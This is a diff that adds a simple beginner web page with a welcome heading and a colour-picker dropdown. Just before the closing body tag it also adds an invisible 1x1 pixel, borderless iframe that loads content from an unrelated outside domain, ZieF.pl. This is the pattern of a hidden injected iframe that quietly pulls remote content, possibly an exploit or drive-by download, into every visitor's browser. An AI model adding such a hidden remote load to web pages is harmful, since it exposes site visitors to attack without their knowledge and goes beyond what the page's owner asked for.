@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>My Website</title>
+        <script>
+          function mySelect(color){
+              document.getElementById("hello").style.color=color;
+          }
+
+            
+            
+        </script>
+    </head>
+    <body>
+        <h1 id="hello">Hello!Welcome to Our PreIntern Group.</h1>
+        <select id="select" onchange="mySelect(this.options[this.selectedIndex].value)">
+        <option value="black">Black</option>
+        <option value="red">Red</option>
+        <option value="green">Green</option>
+        <option value="blue">Blue</option>
+        </select>
+    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
